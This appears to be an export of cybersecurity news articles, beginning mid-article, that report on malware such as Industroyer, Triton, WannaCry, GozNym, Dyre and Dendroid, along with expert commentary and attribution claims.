this time, whether Industroyer has been used beyond Ukraine. The concentration in Ukraine is plausibly rooted in the Russian/Ukraine conflict in general. Further, the adversary may also be leveraging the Ukraine grid as a test bed – enabling it to further refine its malware and methods and better understand how victims will respond.” Alan Brill, Senior Managing Director, Cyber Security & Investigations, Kroll: “The parts of an ICS “talk” to one another over data lines. In this case, an electric grid ICS could talk to a switch at a given substation and open or close it. Doing this to the right combination of switches can cause power to flow where it can cause damage to equipment and leave people in the dark with power outages. To avoid a utility being tied to only one vendor, the “languages” that these devices use to communicate became standardized across manufacturers. So once you understand how the language works, it’s going to work in a lot of power networks.   These systems were developed with the assumption that they weren’t connected to the Internet. Thus, commands could only come from the authorized users. Once the malware is in, it is able to transmit completely accurate and valid-appearing commands, and the language does not provide for positive authentication of the source.   Even more interesting, the “bad guys” realized that the authorized users could undo the damage they caused by issuing correcting commands. My understanding is that the malware also can wipe the software from the switch, so that undoing the unauthorized command takes manual intervention at the switch, which prolongs the problem.” Barak Perelman, CEO, Indegy: “This malware demonstrates why ICS control-plane protocols must be protected. These proprietary, vendor-specific protocols, which are used to communicate with control devices (e.g. PLCs, RTUs and DCS) in industrial networks, make it very difficult to monitor access and changes made to critical devices. This lack of visibility enables adversaries to effectively attack these systems while hiding in plain sight.   Detecting malicious activity requires a deep understanding of these native protocols which cannot be accomplished using traditional network monitoring tools or by looking for network anomalies. Monitoring activity performed over control-plane protocols would have immediately identified all the reconnaissance scans in the CRASHOVERRIDE attack and enabled operational staff to prevent the outage. This approach can also identify attempts to tamper with these devices in real-time so threats can be mitigated before any damage is done.” “Nathan Wenzler, chief security strategist, AsTech: “Incidents involving malware that target specific ICS systems, such as industroyer, are still relatively rare occurrences. However, because of their focus on disrupting power grids and other industrial systems, the amount of damage that can be caused can be incredibly significant. While malware of this nature targeting assets here in the U.S. as yet to reported publicly, it's incredibly likely that we will eventually face such a threat. Since malware like this is often backed by government groups, there is a lot of political motivation behind propagating this kind of attack to cause damage to infrastructure or other core services provided to large populations.   Industroyer is particularly interesting in that it is built in a modular fashion, which allows for multiple tools, exploit kits, or customized attack methods for different ICS targets to be added quickly and easily. This will make it trivial for whoever wrote this code to modify it for attacks against different targets or types of systems, allowing for a sort of morphing characteristic that will make it harder to detect and protect against as more and more variations are released into the wild. Add to this the fact that many vendors of ICS products don't often build security into their applications or provide quick upgrades, patches or hotfixes in response to identified vulnerabilities, it makes a malleable, flexible malware package like industroyer especially dangerous to defend against even if the variants are identified.” John Bamabenek, Threat Research Manager, Fidelis Cybersecurity: “In the realm of security, bigger nations picking on smaller nations is nothing new and it’s often done without consequence. If Russia is behind this latest attack, there isn't much Ukraine can do about it. If Ukraine did have sufficient deterrent capability, they'd have kicked Russia out of Crimea and Eastern Ukraine by now.   Picking on the US is another matter. Unlike Russia’s election information operations, the US has a wide variety of response strategies. The US can launch physical attacks and respond in-kind. After all, the US and allies created Stuxnet. It can always decide to put the band back together.   The fact that the US can retaliate does not mean we aren't at risk. As a nation, we have a wide variety of infrastructure that’s susceptible to attack. At the moment, our largest defense seems to be deterrence.” Paul Edon, Director of International Customer Services, Tripwire: “Historically Industrial networks have used airgap and diode based architecture to defend against the risks associated with corporate intranet and Internet communications. However, due to economic pressures i.e. increasing costs and decreasing numbers of skilled resources, it has become necessary for many organizations to centralize some of the management and control functions that would have previously been local to industrial plants, refineries, distribution facilities etc. This centralization has meant expanding the reach of the enterprise network into the industrial environment, and in doing so, exposing those industrial environments to levels of cyber risk for which they were neither secured nor designed.   Post design security is always a much greater challenge than the “security by design and default” that we would expect today. However, the majority of attacks can still be defended against by employing the same strategy as that used for the enterprise i.e. “Security Best Practise,” “Defence in Depth” and “ Foundational Controls.” Kaspersky Lab: “Malware with such functionality is pretty unique - although it shares ideas and approaches with other malware we have seen and attacks we have investigated. However, Kaspersky Lab and its ICS CERT have been warning for some time that cyber-attackers are increasingly willing and able to launch attacks on critical infrastructure, particularly industrial control systems connected to the Internet – while organizations and countries remain worryingly under-prepared. In order to protect the ICS environment from possible cyber-attacks, Kaspersky Lab advises the following: Bryan Singer, Director of Industrial Cybersecurity Services and Sales, IOActive: “CrashOverride is a threat, certainly, and yet another wake up call for the industry. How large of a threat? It may impact lots of systems globally, but it is unlikely it will have widespread impacts to grid operations. The good news about attacking power grids is that it is hard. Not impossible, but certainly difficult. And requires insider equivalent information about systems across largely geographic areas. Also, given the mixture of digital, analog, and manual systems, widespread outages are unlikely from malware alone.   But, combining various cyber-physical techniques along with malware in a combined threat could certainly force multiply what CrashOverride can do now into a large scale grid event. That would require a lot of information about substation automation, what systems were in use, timing requirements between substations, interconnected systems across multiple utilities, and a myriad of other data. All obtainable, but certainly a large work effort to pull off.” Joseph Carson, chief security scientist, Thycotic: “It’s very likely we’ll see similar attacks in the US as most of the SCADA Control Systems and industrial control systems being used are the same. The major difference will be on how well those systems are being protected and what additional security controls are in place. For example, many of the incidents like that which occurred in Ukraine was a failure to even do the basic security controls that allowed the attackers to easily gain access and laterally move around the network undetected eventually carrying out the malicious activity. This highlights that cyber-criminals with sufficient technical knowledge, resources and time can plan an effective attack with potentially serious catastrophic results.” Andrea Carcano, Co-founder and Chief Product Officer, Nozomi Networks: “Organizations with Industrial Control Systems (ICS) should know that technology is available today that provides real-time cybersecurity visibility for SOCs (Security Operations Centers) and that detects and mitigates APTs on OT systems.   For example, such a solution will detect queries being made to devices to collect data that could be used to design and implement a critical systems attack. And, through a deep understanding of the process being run by the ICS, identify that process parameters are changing and could bring the system into a critical state.   Once alerts about both data collection communications and process variable changes are communicated to the SOC, staff can execute prevention and mitigation measures.” Sven Schrecker, Chair, Industrial Internet Consortium Security Working Group: “Attacks on critical infrastructure are becoming too common in the world today. Furthermore, the techniques being implemented by the bad guys are becoming more advanced in their capabilities. It is a grave concern that these threats may target US infrastructure and succeed in doing significant damage. We’ve seen such activity at a small scale in the past, and that should be a wake-up call that we must be proactive.   The methods for delivering the malware and attacking the systems is evolving at an ever increasing pace. Unfortunately, the legacy equipment that makes up the majority of the critical infrastructure base was never designed with cyber security in mind. The attackers are preying on this oversight. Fortunately, existing technology can be applied to critical infrastructure to mitigate some of the most egregious vulnerabilities and enable the critical infrastructure to continue to use the legacy protocols and processes with additional security in place.” David Zahn, GM of Cybersecurity Business Unit, PAS: “There seems an undercurrent of surprise or reactionary concern when we hear details on how bad actors are advancing sophisticated means to attack critical infrastructure. In power, we are in denial that a similar attack could happen in the US. We also get mired in misconceptions that we are well prepared because of regulation, or squirrels - yes squirrels - are more likely to bring down power than a hacker. The problem is that nation states have a plan, squirrels do not.   The latest news about Crash Override is one more wakeup call that we need to become better at the cybersecurity basics which most industrial companies struggle doing today - know what ICS cyber assets you have (from smart field instruments to controllers to workstations), identify and managing vulnerabilities, detect when an unauthorized change occurs, and ensure backups are available.”  Learn More at SecurityWeek’s 2017 ICS Cyber Security Conference " }

According to General Dynamics Fidelis Cybersecurity Solutions, AlienSpy is the successor of well-known RATs such as Frutas, Adwind and Unrecom. These predecessors are still being used in attacks, particularly Adwind, but researchers have noticed a wave of AlienSpy samples targeted at consumers and organizations in sectors such as energy, government, financial services, and technology. AlienSpy, which is advertised on the alienspy(dot)net website as “the best software for take (sic) remote control of your devices,” supports multiple platforms, including Windows, Linux, Mac and Android. The tool is not promoted as a piece of malware, but the antivirus disabling features and the fact that customers can test their builds to see if they are detected by security products provide some clues to AlienSpy’s true nature.  The RAT, sold for between $20 and $220 depending on the package, uses a dozen plugins to accomplish various tasks. Because it uses a modular plugin framework, AlienSpy can be easily upgraded with new capabilities, Fidelis noted in its report. Similar to other RATs, the threat can collect information on the infected system, download and execute other malware, capture data from the device’s webcam and microphone, initiate a remote desktop session to monitor the victim’s activities, access files on the system, log keystrokes, and steal web browser passwords. In addition to these standard features, AlienSpy can detect the presence of sandboxes, and detect and disable antivirus and security tools. Another noteworthy aspect is the use of the Transport Layer Security (TLS) protocol for command and control (C&C) server communications. The samples analyzed by Fidelis researchers have been distributed through phishing campaigns involving emails that appear to be related to payments and orders. On one of the infected machines, experts noticed that AlienSpy downloaded the Citadel banking Trojan. Experts have found several clues linking AlienSpy to Unrecom and its other predecessors, including code reuse and similar configuration files. “Since November 2013, Adwind RAT has been known to be sold under the Unrecom RAT name. Adwind RAT is known to have evolved from Frutas RAT. Frutas RAT has been used in phishing emails against high-profile companies in Europe and Asia in sectors such as finance, mining, telecom, and government,” Fidelis explained in its report. The complete report on AlienSpy, which includes a Yara rule and indicators of compromise (IoC), is available online. " }

Canada, Japan, Australia and New Zealand have also blamed Pyongyang for the attack. The U.K. accused North Korea in late October, and the other Five Eyes countries and Japan have now done the same. “We are aware of the statements made by our allies and partners concerning the role of actors in North Korea in the development of the malware known as WannaCry,” said Greta Bossenmaier, chief of Canada’s Communications Security Establishment (CSE). “This assessment is consistent with our analysis.” Australia said its own intelligence agencies reached the same conclusion after consultations with allies. New Zealand attributed the WannaCry attack to North Korean threat actors based on “cyber threat analysis from a range of sources, including the United States and the United Kingdom.” The WannaCry ransomware was unleashed in May and it infected roughly 300,000 computers across 150 countries. The malware spread using exploits developed by the Equation Group, an actor linked to the U.S. National Security Agency (NSA). North Korea in October denied the accusations, claiming that they were a “wicked attempt\" to further tighten international sanctions. Furthermore, not everyone believes North Korea is responsible. Endpoint security firm Cybereason said in May that the attack did not fit Pyongyang’s style and interests, and the company stands by its initial assessment. Nevertheless, the United States is convinced that the WannaCry attack is the work of North Korea, which is believed to be responsible for several recent profit-driven campaigns. “We do not make this allegation lightly,” said White House homeland security advisor Tom Bossert. “We do so with evidence, and we do so with partners.” One of those partners is Microsoft, which concluded that the North Korea-linked threat actor known as Lazarus – the company tracks it as ZINC – was responsible for the ransomware attack. “Among other steps, last week we helped disrupt the malware this group relies on, cleaned customers’ infected computers, disabled accounts being used to pursue cyberattacks and strengthened Windows defenses to prevent reinfection. We took this action after consultation with several governments, but made the decision independently,” said Brad Smith, president and chief legal officer at Microsoft. “We are pleased to see these governments making this strong statement of attribution. If the rising tide of nation-state attacks on civilians is to be stopped, governments must be prepared to call out the countries that launch them,” Smith said. Facebook also had a role in disrupting the activities of the Lazarus group, but pointed out that its actions were not focused on the WannaCry malware itself. “In this case, we deleted accounts operated by this group to make it harder for them to conduct their activities. Similar to other threat groups, they largely used personal profiles and pretended to be other people in order to do things like learning about others and building relationships with potential targets,” the social media giant stated. “We also notified people who may have been in contact with these accounts and gave suggestions to enhance their account security, as we have done in the past about other threat groups,” it added.

The existence of GozNym, which is a combination between the Nymaim dropper and the Gozi ISFB banking Trojan, was brought to light in April by IBM Security researchers. The malware has been seen targeting the customers of numerous banks in North America and Europe. Experts from Cisco’s Talos team have analyzed the malware and identified a total of four variants, each using a slightly different version of a DGA. In the attacks observed by Cisco, cybercriminals delivered GozNym using spear phishing emails containing specially crafted Word documents designed to download and execute a malicious binary via VBA macros. Once it has been successfully deployed on a system, the Trojan hijacks the victim’s browsing session in an effort to redirect them to a phishing website. GozNym first checks Internet connectivity through a DNS query for google.com and microsoft.com records. It then queries the command and control (C&C) domains generated by its DGA either via a simple gethostbyname API call or via a complex DNS protocol implementation leveraging Google’s DNS servers. Researchers identified several DGA variants. One of the more interesting DGAs relies on the XORShift pseudorandom number generator (PRNG) to create a list of 15 domain names with a length ranging between 5 and 12 characters and a suffix randomly selected between .net, .com, .in or .pw. The PRNG is seeded using two hardcoded DWORD values and a bit-shifted value of the current day. Once the 15 domain names are generated, the malware queries each of them to determine if the IP responses are publicly routable. When two different IPs are resolved, they are used in the second stage of the DGA. The second stage is similar, but it replaces the hardcoded DWORD seeds with the IP addresses obtained in the first stage. In this stage, the malware creates a list of 128 domain names. The GozNym DGA is complex, but Cisco researchers have identified flaws that allowed them to predict domain names using brute force. The company has started sinkholing GozNym domains and it wants to do so for every botnet it finds. Cisco’s sinkhole server was contacted more than 23,000 times within the first 24 hours, and since the Trojan is designed to only beacon a domain once, experts believe this represents the approximate number of infected devices. The connections came from 1,854 unique IP addresses. A majority of them were traced to Germany (47%) and the United States (37%). Some infections were also spotted in Poland, Canada and the United Kingdom. Cisco has made available several scripts that other researchers can use to analyze GozNym samples, including the DGA and C&C communications. " }

This latest edition affects more than 110 applications and turns the victim's computer into a botnet client. The malware also steals passwords from five crypto currency wallets, and its banking module is set to target 17 German banks. In all cases, Reveton contains a link to download an additional password stealer. \"Reveton [uses] one of the best password/credentials stealer on the malware scene today,\" Avast reported in a blog post. \"Pony authors conduct deep reverse engineering work which results in almost every password decrypted to plain text form. The malware can crack or decrypt quite complex passwords stored in various forms.\" Pony includes 17 main modules like operating system credentials, FTP clients, browsers, email clients, instant messaging clients, online porker clients and more than 140 submodules. The new version of Reveton also has an upgraded lockscreen module. The authors of the malware divided the program into multiple threads, changed the encryption, saved the payload to registry and recreated communication with command and control servers. \"Reveton has also prepared another password stealer downloaded from the Papras family,\" Avast researchers noted. \"This malware is not as effective as the Pony but contains a powerful AV kill/disable function.\" According to Avast, the most common infection is via some well-known exploit kits, such as Fiesta, Nuclear and Sweet Orange. In 2012, the FBI issued a warning about Reveton after complaints came pouring in to the Internet Crime Complaint Center about fake messages from the FBI demanding recipients pay a fine for visiting child pornography sites on the Web. Those that didn't pay would have their computers locked. The ransomware scam demanded victims pay $200 to get control of their computers back. \"As we have shown, the high profits from the former Reveton model, unlocking the infected computer after the user pays a ransom, is not enough,\" according to Avast. \"Malware authors have decided to enter into a new black business area. Passwords to various systems and crypto currency wallets are a very lucrative commodity today. Some passwords (FTP, emails, IM…) are perfectly suited for spreading their malware and build stronger botnets.\"   " }

In October 2016, Kaspersky’s Industrial Control Systems Cyber Emergency Response Team (ICS CERT) noticed a significant increase in malware infection attempts aimed at industrial organizations in the metallurgy, construction, electric power, engineering and other sectors. The security firm had observed attacks against 500 organizations in more than 50 countries. The attacks started with spear phishing emails carrying documents set up to exploit an Office vulnerability (CVE-2015-1641) patched by Microsoft in April 2015. The phishing messages were well written and they purported to come from the victim’s suppliers, customers, or delivery services. The malicious documents delivered a wide range of malware, including ZeuS, Pony, LokiBot, Luminosity RAT, NetWire RAT, HawkEye, ISR Stealer, and the iSpy keylogger. While the significant number of malware families used suggests that the emails could be part of multiple campaigns, there are some elements linking them together. Researchers noticed that all malware samples delivered in the attacks were packed with VB and .NET packers. Furthermore, they all communicate with the same command and control (C&C) servers. This indicates that it’s either one group behind all attacks, or multiple threat actors are working together. According to Kaspersky, many of the C&C domains mimicked the domains of industrial companies – the attackers either registered the same name on a different TLD or they registered a name that was very similar to the legitimate domain. In some cases, the cybercriminals breached the targeted organization’s website using stolen credentials and abused it to host malware and C&C servers. Experts noted that a majority of the C&C domains used in these attacks were registered to residents of Nigeria. The malware delivered in this campaign has helped the hackers steal data they can use for business email compromise (BEC) attacks, where attackers claim to represent a business partner or customer and trick the targeted organization’s employees into sending them significant amounts of money. The FBI reported last year that losses caused by BEC scams exceeded $3.1 billion. Nigerian cybercriminals have been running these types of schemes for several years now, but Kaspersky researchers believe they recently came to realize that targeting larger companies can be more lucrative and last year they turned their attention to industrial organizations. “Nigerian phishing attacks are particularly dangerous for industrial companies. In the event of a successful attack, the company making a purchase not only loses money but also fails to receive the goods they need on time,” said Kaspersky researchers. “This can be critical for industrial companies: if the goods are raw materials used in manufacturing or spare parts needed to repair equipment, their non-delivery can result in downtime or failure to perform scheduled maintenance or commissioning and start-up work.” Furthermore, experts pointed out that the malware used in these attacks has stolen a wide range of data, including files apparently coming from the workstations of operators, engineers, architects and designers. While it’s unclear if the theft of such files has been monetized, researchers noted that this can pose a serious threat. Kaspersky has also warned that cybercriminals could use their access to make unauthorized changes to industrial control systems (ICS). " }

FireEye and Dragos reported on Thursday that a new piece of malware designed to target industrial control systems (ICS) had caused a shutdown at a critical infrastructure organization somewhere in the Middle East. CyberX has also obtained samples of the malware and based on its threat intelligence team's investigation, Triton/Trisis was likely created by Iran and the victim was likely an organization in Saudi Arabia. “It's widely believed that Iran was responsible for destructive attacks on Saudi Arabian IT networks in 2012 and more recently in 2017 with Shamoon, which destroyed ordinary PCs. This would definitely be an escalation of that threat because now we're talking about critical infrastructure -- but it's also a logical next step for the adversary,” Phil Neray, VP of Industrial Cybersecurity for CyberX, told SecurityWeek. “Stuxnet and more recently Industroyer showed that modern industrial malware can be used to reprogram and manipulate critical devices such as industrial controllers, and Triton appears to be simply an evolution of those approaches,” Neray added. FireEye and Dragos would not comment on CyberX’s theory about Triton being developed and used by Iran. FireEye did however note in its report that the methods used were consistent with attacks previously attributed to Russian, Iranian, U.S., North Korean and Israeli nation-state actors. Triton is designed to target Schneider Electric’s Triconex Safety Instrumented System (SIS) controllers, which are used to monitor the state of a process and restore it to a safe state or safely shut it down if parameters indicate a potentially dangerous situation. The malware uses the proprietary TriStation protocol to communicate with SIS controllers, and it’s capable of adding new ladder logic that allows the attackers to manipulate devices. In the attack analyzed by FireEye and Dragos, the hackers’ activities resulted in the SIS controller triggering a process shutdown, which led to the discovery of the attack. However, experts believe the shutdown was likely an accident. One possible scenario is that the attackers were conducting reconnaissance as part of an operation whose ultimate goal was to cause physical damage. Schneider Electric has published an advisory to inform customers about the incident and provide recommendations on how to prevent potential attacks. The company says there is no evidence that the malware exploits any vulnerabilities in the Triconex product, but it’s still working on determining if there are any other attack vectors. “I think it's a little comical that Schneider Electric felt obliged to state that the attack did not leverage any vulnerabilities in the Tritex product,” Neray commented. “OT environments are ‘vulnerable by design’ because they lack many of the controls we now take for granted in IT networks such as strong authentication. As a result, once an attacker gets into the OT network -- by stealing credentials or connecting an infected laptop or USB, for example -- they have almost free reign to connect to any control device they choose, and then reprogram them with malicious ladder logic to cause unsafe conditions. Based on the FireEye report, this appears to be exactly what the TRITON attackers did, similar to the way Industroyer modified ABB configuration files to perform its attack on the Ukrainian grid.” " }

The threat, dubbed “DualToy” by Palo Alto Networks, has been around since January 2015. While the malware has mainly targeted users in China, the security firm reported that individuals and organizations in the United States, United Kingdom, Thailand, Spain and Ireland were also impacted. Researchers discovered more than 8,000 unique DualToy samples. Earlier variants were only capable of infecting Android devices, but the Trojan’s developers added iOS capabilities within six months after the threat was first spotted. On infected Windows PCs, DualToy injects processes, modifies browser settings and displays ads. When an Android or iOS device is connected to the infected PC via USB, the malware starts conducting various activities. The malware’s developers are counting on the fact that when a user connects a mobile device to the infected computer, that device is likely already authorized, making it easier to use existing pairing records to interact with it in the background. “Although this attack vector’s capability can be further limited by additional mechanisms (e.g., ADB enabling, iOS sandbox) which make this threat not so severe, DualToy reminds us again how attackers can use USB sideloading against mobile devices and how malware can be spread between platforms,” Palo Alto Networks researcher Claud Xiao explained in a blog post. In order to infect Android and iOS devices, the Trojan checks for the presence of the Android Debug Bridge (ADB) and iTunes on the compromised Windows machine. If these applications are not found, the malware downloads and installs them. ADB and iTunes are used by DualToy to install various applications on Android and iOS devices connected via USB to the infected computer. In the case of Android, several Chinese-language games were downloaded from a third-party app store. On iOS phones and tablets, the malware collects system information and sends it back to its command and control (C&C) server. The data includes the device’s name, type, version, model number, serial number, IMEI, IMSI, firmware, and phone number. DualToy also downloads several .ipa files (iOS application archives), including one that asks users to provide their Apple ID and password. The harvested credentials are encrypted and sent to a remote server. This app, named Kuaiyong, is a third-party iOS app store, similar to ZergHelper, which in February managed to slip through Apple’s review process and made it onto the official App Store. Palo Alto Networks has compared DualToy to AceDeceiver and WireLurker, both of which target iOS devices when they are connected to an infected computer. " }

According to Trustwave, the malware is manually installed by attackers after they have compromised a web server. Known as ISN, the malware is used by attackers to target sensitive information in POST requests, and has data exfiltration capabilities in its arsenal, blogged Trustwave's Josh Grunzweig.   \"Encryption is circumvented as the malware extracts this data from IIS itself,\" he blogged. \"This was seen targeting credit card data on e-commerce sites, however, it could also be used to steal logins, or any other sensitive information sent to a compromised IIS instance.\"   The installer has four embedded DLLs that are dropped depending on the victim, the researcher continued. Specifically, there are IIS modules for IIS 32-bit; IIS 64-bit; IIS 7+ 32-bit and IIS7+ 64-bit. The malware also has a VBS file embedded as a PE resource that is used to install or remove the DLLs as an IIS module.   \"Once the module is successfully installed, it will monitor the URIs specified in the configuration file and dump any POST requests encountered to the ‘[filename].log’ file,\" according to Grunzweig. \"The module will also monitor the QUERY_STRING parameter, and can accept a number of commands. I’ve setup a simple IIS instance to demonstrate how this process takes place.\"   \"Overall, this malware does not appear to be widely spread and has only been seen in a few forensic case instances,\" Grunzwieg noted. \"However, the extremely low detection rate in collaboration with the malware’s targeted functionality makes this a very real threat.\" " }
{ "_id" : { "$oid" : "5b27c4986cefc41c844ab375" }, "Category" : "Malware", "Title" : "New \"Triton\" ICS Malware Used in Critical Infrastructure Attack", "Address" : "https://www.securityweek.com/new-ics-malware-triton-used-critical-infrastructure-attack", "Date" : "December 14, 2017", "Article" : "A new piece of malware designed to target industrial control systems (ICS) has been used in an attack aimed at a critical infrastructure organization, FireEye reported on Thursday. Experts believe the attack was launched by a state-sponsored actor whose goal may have been to cause physical damage. Few details have been provided about the targeted organization, and FireEye has not linked the attack to any known group, but believes with moderate confidence that it’s a nation state actor. This assumption is based on the apparent lack of financial motivation and the amount of resources necessary to pull off such an attack. The activity observed by FireEye may have been conducted during the reconnaissance phase of a campaign, and it’s consistent with attacks previously attributed to Russian, Iranian, U.S., North Korean and Israeli nation-state actors. The malware, which FireEye has dubbed “Triton,” is designed to target Schneider Electric’s Triconex Safety Instrumented System (SIS) controllers, which are used to monitor the state of a process and restore it to a safe state or safely shut it down if parameters indicate a potentially hazardous situation. According to analysis (PDF) conducted by ICS cyber security firm Dragos, which calls the malware \"TRISIS\", the victim was an industrial asset owner in the Middle East.  The engineering and maintenance tool used by Triconex SIS products is TriStation. The TriStation protocol is proprietary and there is no public documentation for it, but Triton does leverage this protocol, which suggests that the attackers reverse engineered it when creating their malware. Triton, which FireEye has described as an attack framework, is designed to interact with Triconex SIS controllers. The malware can write and read programs and functions to and from the controller, and query its state, but not all capabilities had been leveraged in this specific attack. The hackers deployed Triton on a Windows-based engineering workstation. The malware had left legitimate programs running on the controllers in place, but added its own programs to the execution table. The threat attempts to return the controller to a running state in case of a failure, or overwrite the malicious program with junk data if the attempt fails, likely in an effort to cover its tracks. In general, once the SIS controller has been compromised, the attacker can reprogram the device to trigger a safe state, which could cause downtime and result in financial losses. Attackers could also reprogram the SIS so that it allows dangerous parameters without triggering the safe state, which can have a physical impact, including on human safety, products and equipment, FireEye said. However, the physical damage that can be done via the SIS controller is limited by the mechanical safety systems deployed by an organization. In the case of the critical infrastructure attack investigated by FireEye, the attackers shut down operations after causing the SIS controllers to initiate a safe shutdown, but they may have done it inadvertently while trying to determine how they could cause physical damage. On the other hand, FireEye noted that “intrusions of this nature do not necessarily indicate an immediate intent to disrupt targeted systems, and may be preparation for a contingency.” Schneider Electric has launched an investigation into this incident, but initial evidence suggests that Triton does not leverage any vulnerabilities in the Triconex product and the company is not aware of any other attacks. “It is important to note that in this instance, the Triconex system responded appropriately, safely shutting down plant operations. No harm was incurred by the customer or the environment,” the industrial giant said. Schneider said the targeted safety controllers are widely used in critical infrastructure, and it’s working on determining if there are any additional attack vectors. In the meantime, customers have been advised not to leave the front panel key position in “Program” mode when the controller is not being configured. The malware can only deliver its payload if the key switch is set to this mode. Signatures of the malware samples identified by FireEye have been provided to cybersecurity firms so security products should be able to detect at least some variants of the threat. There are only a handful of malware families specifically designed to target industrial systems, including the notorious Stuxnet, and Industroyer, the malware used in the December 2016 attack aimed at an electrical substation in Ukraine. Last year, FireEye identified an ICS malware dubbed IRONGATE, but it had not been observed in any actual attacks, leading experts to believe that it may have been developed for research purposes. " }

IBM has dubbed the operation 'The Dyre Wolf' after the Dyre malware at the center of the scheme. In October, US-CERT warned the malware was being used in spear-phishing campaigns to steal money from victims. In the campaign uncovered by IBM, attackers often used phony invoices laced with malware to snare their victims. While the file inside the attached zip file has an embedded PDF icon, it is actually an EXE or SCR file. Once opened, the victim is served the Upatre malware, which in turn downloads Dyre. \"Once Dyre is loaded, Upatre removes itself as everything going forward is the result of the extensive functionality of Dyre itself,\" IBM noted in its report. \"The password-stealing function of Dyre is the focus of this campaign, and ultimately what's used to directly transfer the money from the victim’s account. Dyre’s set up, much like Upatre’s, requires a number of steps to remain stealthy which helps it to spread itself to additional victims.\" Dyre also hooks into the victim's browsers (Internet Explorer, Chrome and Firefox) in order to steal credentials the user enters when they visit any of the targeted bank sites. In some cases, possibly due to the use of two-factor authentication, an extra dose of social engineering is used.  \"Once the infected victim tries to log in to one of the hundreds of bank websites for which Dyre is programmed to monitor, a new screen will appear instead of the corporate banking site,\" blogged John Kuhn, senior threat researcher at IBM. \"The page will explain the site is experiencing issues and that the victim should call the number provided to get help logging in.\" According to IBM, when the victims call the number, they are greeted by a person with an American accent who states he works with the affected bank. After a brief conversation, the individual prompts the person to give their username and password and appears to verify it several times. The person may also ask for a token code, and ask to speak with a co-worker with similar access to the account and get information from them as well. \"One of the many interesting things with this campaign is that the attackers are bold enough to use the same phone number for each website and know when victims will call and which bank to answer as,\" Kuhn blogged.  This all results in successfully duping their victims into providing their company’s banking credentials, he added. After stealing the credentials, the attacker logs into the account and transfers large sums of money to various offshore accounts, IBM notes in its report. There have been reports of amounts ranging from $500,000 to $1 million USD being stolen via multiple, smaller transactions. As if that were not enough, the victim may also be hit with a distributed denial-of-service attack to cover the attacker's tracks. \"The DDoS itself appears to be volumetric in nature,\" according to IBM's report. \"Using reflection attacks with NTP and DNS, the Dyre Wolf operators are able to overwhelm any resource downstream. While they may have the potential to attack any external point in a business's network, the incidents we are tracking appear to focus on the company's website.\" Back in October, IBM's Trusteer team tracked a spike in the infection rate of Dyre, which is now believed by the firm to be in direct relationship with the development advancements within the Dyre project. In its current form, the malware appears to be owned and operated by a closed cyber-gang based in Eastern Europe, though the malware code itself could be operated by several connected teams attacking different geographies, IBM reported. \"The sophistication and the level of deception that Dyre is now using is unprecedented when it comes to banking trojans,\" Kuhn told SecurityWeek. \"The social engineering to defeat two-factor authentication shows the level of dedication and persistence to obtain their goal. Covering their tracks by initiating the denial-of-service attacks demonstrates how far they will go to ensure that the illicit transfer of money is hidden for as long as possible. The Dyre Wolf campaign is well funded, sophisticated and methodical in the theft off large sums of money.\" *This story was updated with additional information about the attack.  " }

In a research paper published this week (PDF), Imperva said cloud servers -- called Database as a Service (DBaaS) -- are offering a rich environment for malicious hackers to anonymously set up command-and-control servers and store stolen corporate data. \"When an organization's internal data is stored in the cloud, an attacker no longer needs to gain access to the organization's network, before compromising its database. This is compounded when a hacker opens his own account with the same cloud service. By doing that, the attacker can gain privileges or use a vulnerability to compromise all of the hosted data,\" according to the report. Imperva said it found evidence of this new trend in a botnet that uses a banker Trojan to hijack sensitive financial data from users in South America.  The Trojan uses a popular MSSQL hosting service for its C&C functionality as well as its storage (\"drop\") server. After analyzing the botnet, Imperva researchers discovered five different C&C databases and two storage databases hosted with the same service provider.  Although the researchers did not find evidence of a database hack, Imperva believes it's only a matter of time before criminal hackers start using \"off-the-shelf malware\" for generic database access inside the enterprise. \"Once their motivation and business model becomes clear, whatever they lack in terms of technology they are certain to achieve. At that point, internal data stores of many more organizations are going to be part of the attack surface,\" the company warned. \"These include organizations of all sizes and verticals – not only large defense contractors. Based on our observations and analysis, we expect the first generation of such tools to use standard SQL access to servers relying on default or stolen credentials for initial access. We expect this first generation of tools to target standard database structures of well-known applications (e.g. SAP, PeopleSoft),\" it added. In the past, attacks against databases require admin rights or privilege escalation. However, with this discovery, Imperva is calling attentionn to the fact that malware with database capabilities can wreak havoc and pilfer corporate data.  The company believes that \"infection is inevitable\" and compromise of a portion of workstations within a network should be considered \"an inherent condition.\"  Imperva called on organizations to improve controls around data stores as a mitigation strategy, focusing on technologies like database audit and DAM (database activity monitoring). In the report, the company said organizations that host their data in a cloud service are exposing it to higher risks than originally perceived.  \"Due to the exposure of the database to technically savvy attackers and to the ease of obtaining a legitimate foothold on such a server, risk factors are increased. This can quickly be turned into a privilege escalation attack. This change in how we perceive the risk should be taken into consideration by organizations when they decide which data they want to store externally It should also serve as a wake-up call for service providers to look for deploying virtual patching solutions,\" according to the report.  " }

The existence of Dendroid (Android.Dendoroid) was first reported by Symantec in March when the threat was causing a buzz on underground forums. Dendroid is a HTTP RAT that has a complex control panel and an APK binder that allows cybercriminals to repackage and trojanize legitimate Android apps with the malware. The Trojan was sold for a one-time fee of $300, for which customers got features that enabled them to delete call logs, call specified phone numbers, open websites, record calls and audio, intercept messages, open applications, initiate denial-of-service (DoS) attacks, take pictures and record video. In addition, the seller promised 24/7 support. The source code for Dendroid, its control panel, the APK binder and updates for bug fixes were put up for sale on hacker forums in late July. It was initially sold for 1 Bitcoin, but the seller later made a 50% discount. The code was then leaked on Friday to GitHub and is accompanied by a \"readme\" file that provides a list of requirements needed to run the threat, along with instructions on how to set it up. After examining the source code, researchers from PhishLabs found multiple vulnerabilities caused by the lack of user input validation. They have identified cross-site scripting (XSS), SQL injection, arbitrary file upload, and PHP code execution flaws.   \"The lack of user input validation in Dendroid's control panel is severe, especially when you consider the level of operational security needed in even smaller crimeware campaigns,\" PhishLabs Threat Analyst Paul Burbage explained in a blog post.  One of the vulnerabilities, for which PhishLabs has published a proof-of-concept, is an unsanitized user input written to a file called Panel/config.php via a POST request to Panel/applysettings.php. By rewriting the configuration file, an attacker can inject and execute arbitrary PHP code, and even make the control panel inoperable.  This isn't the only piece of malware which had its source code was put up for sale recently. In May, malware authors began advertising the source code for version 2.0 of the information-stealing Trojan Pony Loader (Fareit).  \"In the past, malware source code leaks have spawned several variants and led to more widespread use of the crimeware features that made the original malware desirable,\" Burbage explained. \"When the source code for Zeus Trojan was leaked in 2011, for example, it accelerated the proliferation of features designed to bypass online banking security measures.\" While Dendroid is in a different league than Zeus, the expert believes that the leaked code will most likely result in the widespread use of the Android RAT and its future variants.   